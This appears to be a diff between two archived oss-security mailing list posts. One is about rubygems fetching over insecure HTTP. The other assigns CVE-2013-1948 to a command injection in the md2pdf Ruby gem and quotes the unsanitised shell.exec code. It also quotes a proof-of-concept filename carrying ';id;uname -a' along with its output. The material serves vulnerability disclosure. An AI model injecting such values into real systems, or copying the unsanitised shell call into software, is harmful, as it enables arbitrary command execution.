@@ -1,62 +1,83 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/15/9
-Message-ID: <20130815083745.GQ16388@suse.de>
-Date: Thu, 15 Aug 2013 10:37:45 +0200
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/13/3
+Message-ID: <51690D1A.4020208@redhat.com>
+Date: Sat, 13 Apr 2013 01:45:30 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Cc: kseifried@...hat.com
-Subject: Re: rubygems insecure download (and other problems)
+CC: "Larry W. Cashdollar" <larry0@...com>
+Subject: Re: Remote command injection md2pdf ruby gem
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Aug 14, 2013 at 05:02:36PM -0400, Donald Stufft wrote:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+On 04/12/2013 08:09 PM, Larry W. Cashdollar wrote:
 > 
-> On Aug 14, 2013, at 4:59 PM, Kurt Seifried <kseifried@...hat.com> wrote:
+> Remote command injection md2pdf ruby gem
 > 
-> > Signed PGP part
-> > I don't think this is CVE worthy, but it is worth fixing and not
-> > putting everyone at such risk:
-> > 
-> > https://bugzilla.novell.com/show_bug.cgi?id=834785
-> > https://bugzilla.redhat.com/show_bug.cgi?id=997179
-> > 
-> > Problem #1:
-> > install /etc/gemrc to install gems via https rather than http
-> > 
-> > everyone should be enabling HTTPS where possible, intercepting and
-> > modifying HTTP is trivial.
-> > 
-> > Problem #2:
-> > it redirects to  production.cf.rubygems.org which is on cloudfront so
-> > has certificate mismatch, so either users have to accept insecurity,
-> > or... well there is no second choice =(.
-> > 
-> > https://www.ssllabs.com/ssltest/analyze.html?d=production.cf.rubygems.org
-> > 
-> > - -- 
-> > Kurt Seifried Red Hat Security Response Team (SRT)
-> > PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-> > 
+> /4/10/2013/ 
+> ------------------------------------------------------------------------
+>
+>  Description: "creates pdf documents from markdown documents"
 > 
-> pip has a CVE for downloading via HTTP, does switching the
-> gem to HTTPS actually make gem verify it?
+> https://rubygems.org/gems/md2pdf
 > 
-> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1629
+> In md2pdf/converter.rb we see user supplied input being passed to
+> the command line with out proper sanitization.
+> 
+> 12       shell.exec("pandoc#{options} #{input_filename} -o
+> #{output_filename}")
+> 
+> 23 shell.exec("pdftk #{temp_filename} multibackground
+> #{background_path} outpu t #{output_filename}")
+> 
+> Where exec is defined as the following:
+> 
+> 37     def exec(command_line) 38       require 'open3' 39
+> stdin, stdout, stderr = Open3.popen3(command_line) 40       return
+> stdout.read 41     end
+> 
+> 
+> Notes
+> 
+> irb(main):001:0> require 'open3' => true irb(main):002:0> stdin,
+> stdout, stderr = Open3.popen3('pdfcnv filename;id;uname -a;.pdft') 
+> => [#, #, #] irb(main):003:0> puts stdout.read uid=1000(larry)
+> gid=1000(larry)
+> groups=1000(larry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),117(sambashare)
+>
+> 
+Linux underfl0w 3.2.0-39-virtual #62-Ubuntu SMP Wed Feb 27 22:45:45 UTC
+2013 i686 athlon i386 GNU/Linux
+> => nil
+> 
+> http://vapid.dhs.org/advisories/md2pdf-remote-exec.html
+> 
+> This vulnerability doesn't have a CVE yet assigned.
+> 
+> Larry W. Cashdollar @_larry0
 
-Some SSL certificate issues in Ruby were also fixed...
+Please use CVE-2013-1948 for this issue.
 
-... testing by pointing rubygems.org to another host with https gives:
 
-$ gem install foo
-ERROR:  Could not find a valid gem 'foo' (>= 0) in any repository
-ERROR:  While executing gem ... (Gem::RemoteFetcher::FetchError)
-    SSL_connect returned=1 errno=0 state=SSLv3 read server certificate B: certificate verify failed (https://rubygems.org/latest_specs.4.8.gz)
-...
 
-I think a "package management" solution that installs software on a system should
-have good security measurements by default these days, and trivial man-in-the-middle
-attacks should not be possible.
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
 
-So the implicit assumption "installing gems is secure" is violated here, which would
-require a CVE I think.
-
-Ciao, Marcus
+iQIcBAEBAgAGBQJRaQ0ZAAoJEBYNRVNeJnmTN0YP/2/mIM5QppooHJ77lM7OvZCt
+N5u45ZMY/jQPndbUozU/r+LXXpEzmxVtMZDGft1j7kQVsRs+eP5ZCqmQM2Yw9wZT
+JYlVsFnxLgauyVcXnLZD40V8BhditXH0UWuE6vy21i+5daWQCVkLXWIZkK32QRn2
+jK6bWpFF3uwozHwbf78F+GMiBRpKp2+GyU6pWnb84REMI1LYESIAEBPA8+db5efA
+hTwPiMUCSEEJIzJhKJIIXNE3/cu0v/YJk5ePx8ZdoU8Po5gti5ZCZavZqO8TM9Lq
+JBamkbJz+5WCwK9wAskTY5kwIBh4LT6Onu8jhwC4hmDfB+Vf3ljiLgjrKmmU1I9S
+1po8t9FErWxe9WtZt41PM39awcUkVZArcLABmg4hgX734dLaGJAwBp5JY7Hu4YUm
+h+lzTP+kIulQ4GnGbf+iZKL4SUvR0SQ0fw/S6i8mt6sK5xKOpfovzPYDTDokQOK0
+69vB5duevww6zFdMMc6TDW9dhqi1yhSE8cfugYwdRRR/jUudC4kQE3Z9rbBL8xH2
+OPWGbRLNROzr1rjO2/DE6Eb+SQ6e7IPlBmsDaJDh7botroiIqFWFr6r5PQizSYdq
+YsIKuWPXiF/1SRZonTnl1xji7P4zmdrbgHPLaxxzCMjVaALgtnuoCBV1vmAZyKdy
+Bgh9OPv7pNBHdjhvXtp2
+=mj6w
+-----END PGP SIGNATURE-----
